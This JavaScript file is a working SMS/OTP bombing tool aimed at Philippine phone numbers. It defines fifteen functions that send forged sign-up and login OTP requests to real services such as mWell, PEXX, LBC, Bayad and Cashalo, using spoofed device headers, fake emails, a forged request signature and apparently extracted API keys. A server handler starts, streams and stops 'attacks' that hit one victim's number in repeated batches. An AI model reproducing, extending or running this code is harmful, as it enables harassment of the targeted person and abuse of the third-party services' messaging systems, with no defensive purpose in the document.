import { randomBytes, createHash, randomUUID } from 'crypto';

// Rate limiting (anti‑DDOS)
const requestLog = new Map();
const RATE_LIMIT = 10; // max requests per minute per IP
const RATE_WINDOW = 60000;

function isRateLimited(ip) {
  const now = Date.now();
  const windowStart = now - RATE_WINDOW;
  const requests = (requestLog.get(ip) || []).filter(t => t > windowStart);
  if (requests.length >= RATE_LIMIT) return true;
  requests.push(now);
  requestLog.set(ip, requests);
  return false;
}

// Helper functions (identical to Python)
function formatPhone(phone) {
  let cleaned = phone.toString().replace(/[\s\-+]/g, '');
  if (cleaned.startsWith('0')) cleaned = cleaned.substring(1);
  if (cleaned.startsWith('63')) cleaned = cleaned.substring(2);
  return cleaned;
}

function randomString(len) {
  return randomBytes(Math.ceil(len / 2)).toString('hex').slice(0, len);
}

function randomGmail() {
  return randomString(10) + '@gmail.com';
}

function generateKumuSignature(ts, rnd, phone) {
  const secret = "kumu_secret_2024";
  const data = `${ts}${rnd}${phone}${secret}`;
  return createHash('sha256').update(data).digest('hex');
}

// ========== 15 API SERVICES (exact headers & logic from Python) ==========
async function callBombOTP(phone) {
  const formatted = formatPhone(phone);
  const headers = {
    'User-Agent': 'OSIM/1.55.0 (Android 16; CPH2465; OP5958L1; arm64-v8a)',
    'Accept': 'application/json', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json',
    'accept-language': 'en-SG', 'region': 'PH'
  };
  const body = { userName: formatted, phoneCode: "63", password: `TempPass${Math.floor(Math.random() * 9000 + 1000)}!` };
  try {
    const res = await fetch('https://prod.services.osim-cloud.com/identity/api/v1.0/account/register', {
      method: 'POST', headers, body: JSON.stringify(body), signal: AbortSignal.timeout(8000)
    });
    if (res.status === 200) {
      const data = await res.json();
      if (data.resultCode === 201000 || data.resultCode === 200000) return { success: true, message: data.message || 'OTP sent' };
      return { success: false, message: data.message || `Code ${data.resultCode}` };
    }
    return { success: false, message: `HTTP ${res.status}` };
  } catch (e) { return { success: false, message: e.message }; }
}

async function callMWELL(phone) {
  const formatted = formatPhone(phone);
  const headers = {
    'User-Agent': 'okhttp/4.11.0', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json',
    'ocp-apim-subscription-key': '0a57846786b34b0a89328c39f584892b',
    'x-app-version': ['03.942.035','03.942.036','03.942.037','03.942.038'][Math.floor(Math.random()*4)],
    'x-device-type': 'android',
    'x-device-model': ['oneplus CPH2465','samsung SM-G998B','xiaomi Redmi Note 13','realme RMX3700'][Math.floor(Math.random()*4)],
    'x-timestamp': Date.now().toString(), 'x-request-id': randomString(16)
  };
  const body = { country: "PH", phoneNumber: formatted, phoneNumberPrefix: "+63" };
  try {
    const res = await fetch('https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number', {
      method: 'POST', headers, body: JSON.stringify(body), signal: AbortSignal.timeout(20000)
    });
    if (res.status === 200) {
      const data = await res.json();
      if (data.c === 200) {
        let cooldown = 0;
        if (data.d?.resendAt) {
          const resendTime = new Date(data.d.resendAt);
          cooldown = Math.max(1, (resendTime - new Date()) / 1000);
        }
        return { success: true, message: 'OTP sent', cooldown };
      }
      return { success: false, message: `API Error: ${data.c}`, cooldown: 30 };
    }
    return { success: false, message: `HTTP ${res.status}`, cooldown: 30 };
  } catch (e) { return { success: false, message: e.message, cooldown: 30 }; }
}

async function callPEXX(phone) {
  const formatted = formatPhone(phone);
  const headers = {
    'User-Agent': 'okhttp/4.12.0', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json',
    'tid': randomString(11), 'appversion': '3.0.14', 'sentry-trace': randomString(32),
    'baggage': `sentry-environment=production,sentry-public_key=811267d2b611af4416884dd91d0e093c,sentry-trace_id=${randomString(32)}`
  };
  const body = [{ json: { email: "", areaCode: "+63", phone: `+63${formatted}`, otpChannel: "TG", otpUsage: "REGISTRATION" } }];
  try {
    const res = await fetch('https://api.pexx.com/api/trpc/auth.sendSignupOtp?batch=1', {
      method: 'POST', headers, body: JSON.stringify(body), signal: AbortSignal.timeout(20000)
    });
    if (res.status === 200) {
      const data = await res.json();
      if (data[0]?.result?.data?.json?.code === 200) {
        const cooldown = data[0].result.data.json.data?.resendTimeInSec || 60;
        return { success: true, message: 'OTP sent', cooldown };
      }
      return { success: false, message: 'API error', cooldown: 30 };
    }
    return { success: false, message: `HTTP ${res.status}`, cooldown: 30 };
  } catch (e) { return { success: false, message: e.message, cooldown: 30 }; }
}

async function callEZLoan(phone) {
  const formatted = formatPhone(phone);
  const ts = Date.now();
  const headers = {
    'User-Agent': 'okhttp/4.9.2', 'Content-Type': 'application/json', 'imei': '7a997625bd704baebae5643a3289eb33',
    'device': 'android', 'brand': 'oneplus', 'model': 'CPH2465', 'source': 'EZLOAN', 'appversion': '2.0.4',
    'blackbox': `kGPGg${ts}DCl3O8MVBR0`
  };
  const body = { businessId: "EZLOAN", contactNumber: `+63${formatted}`, appsflyerIdentifier: `${ts}-${Math.floor(Math.random() * 1e19)}` };
  try {
    const res = await fetch('https://gateway.ezloancash.ph/security/auth/otp/request', {
      method: 'POST', headers, body: JSON.stringify(body), signal: AbortSignal.timeout(8000)
    });
    if (res.status === 200) {
      const data = await res.json();
      if (data.code === 0) return { success: true, message: data.msg || 'Sent' };
      return { success: false, message: data.msg || 'Failed' };
    }
    return { success: false, message: `HTTP ${res.status}` };
  } catch (e) { return { success: false, message: e.message }; }
}

async function callXpress(phone, index) {
  const formatted = formatPhone(phone);
  const ts = Math.floor(Date.now() / 1000);
  const headers = { "User-Agent": "Dalvik/2.1.0", "Content-Type": "application/json" };
  const body = {
    FirstName: `User${ts}_${index}`, LastName: "Test", Email: `user${ts}_${index}@gmail.com`,
    Phone: `+63${formatted}`, Password: `Pass${Math.floor(Math.random() * 9000 + 1000)}`,
    ConfirmPassword: `Pass${Math.floor(Math.random() * 9000 + 1000)}`
  };
  try {
    const res = await fetch('https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp', {
      method: 'POST', headers, body: JSON.stringify(body), signal: AbortSignal.timeout(8000)
    });
    return res.status === 200 ? { success: true, message: 'OTP sent' } : { success: false, message: `HTTP ${res.status}` };
  } catch (e) { return { success: false, message: e.message }; }
}

async function callAbenson(phone) {
  const formatted = formatPhone(phone);
  const headers = { 'User-Agent': 'okhttp/4.9.0', 'Content-Type': 'application/x-www-form-urlencoded' };
  try {
    const res = await fetch('https://api.mobile.abenson.com/api/public/membership/activate_otp', {
      method: 'POST', headers, body: `contact_no=${formatted}&login_token=undefined`, signal: AbortSignal.timeout(8000)
    });
    return res.status === 200 ? { success: true, message: 'OTP activation sent' } : { success: false, message: `HTTP ${res.status}` };
  } catch (e) { return { success: false, message: e.message }; }
}

async function callExcellentLending(phone) {
  const headers = { 'User-Agent': 'okhttp/4.12.0', 'Content-Type': 'application/json' };
  const body = { domain: formatPhone(phone), cat: "login", previous: false, financial: randomString(32) };
  try {
    const res = await fetch('https://api.excellenteralending.com/dllin/union/rehabilitation/dock', {
      method: 'POST', headers, body: JSON.stringify(body), signal: AbortSignal.timeout(8000)
    });
    return res.status === 200 ? { success: true, message: 'Request processed' } : { success: false, message: `HTTP ${res.status}` };
  } catch (e) { return { success: false, message: e.message }; }
}

async function callBistro(phone) {
  const formatted = formatPhone(phone);
  const url = `https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63${formatted}`;
  const headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 16; CPH2465 Build/BP2A.250605.031.A2; wv) AppleWebKit/537.36',
    'Accept': 'application/json', 'origin': 'http://localhost', 'x-requested-with': 'com.allcardtech.bistro'
  };
  try {
    const res = await fetch(url, { headers, signal: AbortSignal.timeout(10000) });
    if (res.status === 200) {
      const data = await res.json();
      if (data.isSuccessful === true) return { success: true, message: data.message || 'OTP sent' };
      return { success: false, message: data.message || 'API error' };
    }
    return { success: false, message: `HTTP ${res.status}` };
  } catch (e) { return { success: false, message: e.message }; }
}

async function callBayad(phone) {
  const formatted = formatPhone(phone);
  const headers = {
    "accept": "application/json", "content-type": "application/json",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
  };
  const email = randomGmail();
  const body = { mobileNumber: `+63${formatted}`, emailAddress: email };
  try {
    const res = await fetch('https://api.online.bayad.com/api/sign-up/otp', {
      method: 'POST', headers, body: JSON.stringify(body), signal: AbortSignal.timeout(10000)
    });
    if (res.status === 200) return { success: true, message: `OTP sent to ${email}` };
    return { success: false, message: `HTTP ${res.status}` };
  } catch (e) { return { success: false, message: e.message }; }
}

async function callLBC(phone) {
  const formatted = formatPhone(phone);
  const headers = { 'User-Agent': 'Dart/2.19', 'Content-Type': 'application/x-www-form-urlencoded' };
  const body = new URLSearchParams({
    verification_type: 'mobile', client_email: randomGmail(), client_contact_code: '+63',
    client_contact_no: formatted, app_log_uid: randomString(16)
  });
  try {
    const res = await fetch('https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification', {
      method: 'POST', headers, body, signal: AbortSignal.timeout(8000)
    });
    return res.status === 200 ? { success: true, message: 'Verification sent' } : { success: false, message: `HTTP ${res.status}` };
  } catch (e) { return { success: false, message: e.message }; }
}

async function callPickupCoffee(phone) {
  const headers = { 'User-Agent': 'okhttp/4.12.0', 'Content-Type': 'application/json' };
  const body = { mobile_number: `+63${formatPhone(phone)}`, login_method: 'mobile_number' };
  try {
    const res = await fetch('https://production.api.pickup-coffee.net/v2/customers/login', {
      method: 'POST', headers, body: JSON.stringify(body), signal: AbortSignal.timeout(8000)
    });
    return res.status === 200 ? { success: true, message: 'Login OTP sent' } : { success: false, message: `HTTP ${res.status}` };
  } catch (e) { return { success: false, message: e.message }; }
}

async function callHoneyLoan(phone) {
  const headers = { 'User-Agent': 'Mozilla/5.0 (Linux; Android 15)', 'Content-Type': 'application/json' };
  const body = { phone: formatPhone(phone), is_rights_block_accepted: 1 };
  try {
    const res = await fetch('https://api.honeyloan.ph/api/client/registration/step-one', {
      method: 'POST', headers, body: JSON.stringify(body), signal: AbortSignal.timeout(8000)
    });
    if (res.status === 200) {
      const data = await res.json();
      if (data.success === true) return { success: true, message: 'Step one completed' };
      return { success: false, message: data.message || 'Failed' };
    }
    return { success: false, message: `HTTP ${res.status}` };
  } catch (e) { return { success: false, message: e.message }; }
}

async function callKumuPH(phone) {
  const formatted = formatPhone(phone);
  const timestamp = Math.floor(Date.now() / 1000);
  const rndString = randomString(32);
  const signature = generateKumuSignature(timestamp, rndString, formatted);
  const headers = {
    'User-Agent': 'okhttp/5.0.0-alpha.14', 'Content-Type': 'application/json;charset=UTF-8',
    'Device-Type': 'android', 'Device-Id': '07b76e92c40b536a', 'Version-Code': '1669'
  };
  const body = {
    country_code: "+63", encrypt_rnd_string: rndString, cellphone: formatted,
    encrypt_signature: signature, encrypt_timestamp: timestamp
  };
  try {
    const res = await fetch('https://api.kumuapi.com/v2/user/sendverifysms', {
      method: 'POST', headers, body: JSON.stringify(body), signal: AbortSignal.timeout(10000)
    });
    if (res.status === 200) {
      const data = await res.json();
      if (data.code === 200 || data.code === 403) return { success: true, message: data.message || 'OTP sent' };
      return { success: false, message: data.message || 'API error' };
    }
    return { success: false, message: `HTTP ${res.status}` };
  } catch (e) { return { success: false, message: e.message }; }
}

async function callS5(phone) {
  const normalized = `+63${formatPhone(phone)}`;
  const boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW';
  const body = `--${boundary}\r\nContent-Disposition: form-data; name="phone_number"\r\n\r\n${normalized}\r\n--${boundary}--\r\n`;
  const headers = {
    'content-type': `multipart/form-data; boundary=${boundary}`,
    'user-agent': 'Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36'
  };
  try {
    const res = await fetch('https://api.s5.com/player/api/v1/otp/request', {
      method: 'POST', headers, body, signal: AbortSignal.timeout(8000)
    });
    return res.status === 200 ? { success: true, message: 'OTP request sent' } : { success: false, message: `HTTP ${res.status}` };
  } catch (e) { return { success: false, message: e.message }; }
}

async function callCashalo(phone) {
  const formatted = formatPhone(phone);
  const deviceId = randomString(16);
  const headers = {
    'User-Agent': 'okhttp/4.12.0', 'Content-Type': 'application/json',
    'x-api-key': 'UKgl31KZaZbJakJ9At92gvbMdlolj0LT33db4zcoi7oJ3/rgGmrHB1ljINI34BRMl+DloqTeVK81yFSDfZQq+Q==',
    'x-device-identifier': deviceId, 'x-device-type': '1', 'x-firebase-instance-id': randomString(32)
  };
  const body = {
    phone_number: formatted, device_identifier: deviceId, device_type: 1,
    apps_flyer_device_id: `${Date.now()}-${randomString(15)}`, advertising_id: randomUUID()
  };
  try {
    const res = await fetch('https://api.cashaloapp.com/access/register', {
      method: 'POST', headers, body: JSON.stringify(body), signal: AbortSignal.timeout(10000)
    });
    if (res.status === 200) {
      const data = await res.json();
      if (data.access_challenge_request) return { success: true, message: 'Challenge sent' };
      return { success: false, message: 'Unexpected response' };
    }
    return { success: false, message: `HTTP ${res.status}` };
  } catch (e) { return { success: false, message: e.message }; }
}

// ========== Attack state & SSE ==========
let activeAttack = null;
let attackClients = new Set();

export default async function handler(req, res) {
  // Rate limiting (anti‑DDOS)
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  if (isRateLimited(ip)) {
    return res.status(429).json({ error: "Nice try kid! Slow down." });
  }

  // POST – start attack
  if (req.method === 'POST') {
    const { phone, batches } = req.body;
    if (!phone || !batches) return res.status(400).json({ error: 'Missing parameters' });
    const formatted = formatPhone(phone);
    if (!/^9\d{9}$/.test(formatted)) return res.status(400).json({ error: 'Invalid Philippine number' });
    if (batches < 1 || batches > 100) return res.status(400).json({ error: 'Batches 1-100' });
    if (activeAttack) return res.status(409).json({ error: 'Attack already running' });

    activeAttack = {
      phone, batches, cancelled: false,
      stats: { success: 0, fail: 0, total: 0 },
      mwellCooldown: 0, mwellLastCall: 0,
      pexxCooldown: 0, pexxLastCall: 0,
      log: (type, service, batch, success, message) => {
        const logEntry = { type, timestamp: new Date().toLocaleTimeString(), service, batch, success, message };
        attackClients.forEach(client => client.write(`data: ${JSON.stringify(logEntry)}\n\n`));
        if (type === 'stats') activeAttack.stats = { ...activeAttack.stats, ...message };
      }
    };
    runAttack(activeAttack);
    return res.json({ success: true });
  }

  // GET – Server‑Sent Events
  if (req.method === 'GET') {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    attackClients.add(res);
    req.on('close', () => attackClients.delete(res));
    return;
  }

  // DELETE – stop attack
  if (req.method === 'DELETE') {
    if (activeAttack) activeAttack.cancelled = true;
    return res.json({ stopped: true });
  }

  return res.status(405).end();
}

async function runAttack(attack) {
  const { phone, batches, log } = attack;
  const allServices = [
    { name: 'BOMB OTP', func: callBombOTP, cooldown: null },
    { name: 'MWELL', func: callMWELL, cooldown: { get: () => attack.mwellCooldown, set: (c) => attack.mwellCooldown = c, lastCall: () => attack.mwellLastCall, setLast: (t) => attack.mwellLastCall = t } },
    { name: 'PEXX', func: callPEXX, cooldown: { get: () => attack.pexxCooldown, set: (c) => attack.pexxCooldown = c, lastCall: () => attack.pexxLastCall, setLast: (t) => attack.pexxLastCall = t } },
    { name: 'EZLOAN', func: callEZLoan, cooldown: null },
    { name: 'XPRESS PH', func: (p, idx) => callXpress(p, idx), cooldown: null },
    { name: 'ABENSON', func: callAbenson, cooldown: null },
    { name: 'EXCELLENT LENDING', func: callExcellentLending, cooldown: null },
    { name: 'BISTRO', func: callBistro, cooldown: null },
    { name: 'BAYAD CENTER', func: callBayad, cooldown: null },
    { name: 'LBC CONNECT', func: callLBC, cooldown: null },
    { name: 'PICKUP COFFEE', func: callPickupCoffee, cooldown: null },
    { name: 'HONEY LOAN', func: callHoneyLoan, cooldown: null },
    { name: 'KUMU PH', func: callKumuPH, cooldown: null },
    { name: 'S5.COM', func: callS5, cooldown: null },
    { name: 'CASHALO', func: callCashalo, cooldown: null }
  ];

  const delay = ms => new Promise(r => setTimeout(r, ms));

  for (let batch = 1; batch <= batches && !attack.cancelled; batch++) {
    log('batch_start', 'SYSTEM', batch, true, `Starting batch ${batch}/${batches}`);
    const promises = allServices.map(async svc => {
      if (attack.cancelled) return null;
      if (svc.cooldown) {
        const cooldownSec = svc.cooldown.get();
        if (cooldownSec > 0) {
          const elapsed = Date.now() - svc.cooldown.lastCall();
          if (elapsed < cooldownSec * 1000) await delay(cooldownSec * 1000 - elapsed);
        }
      }
      let result;
      if (svc.name === 'XPRESS PH') result = await svc.func(phone, batch);
      else result = await svc.func(phone);
      if (result) {
        attack.stats.total++;
        if (result.success) attack.stats.success++;
        else attack.stats.fail++;
        log('log', svc.name, batch, result.success, result.message || (result.success ? 'Success' : 'Failed'));
        log('stats', '', batch, true, { total: attack.stats.total, success: attack.stats.success, fail: attack.stats.fail });
        if (svc.cooldown && result.cooldown) {
          svc.cooldown.set(result.cooldown);
          svc.cooldown.setLast(Date.now());
        }
      }
      return result;
    });
    await Promise.all(promises);
    if (batch < batches && !attack.cancelled) {
      const wait = Math.floor(Math.random() * 2000 + 3000);
      log('log', 'SYSTEM', batch, true, `Waiting ${wait/1000}s before next batch...`);
      await delay(wait);
    }
  }
  log('completed', 'SYSTEM', batches, true, { total: attack.stats.total, success: attack.stats.success, fail: attack.stats.fail });
  activeAttack = null;
}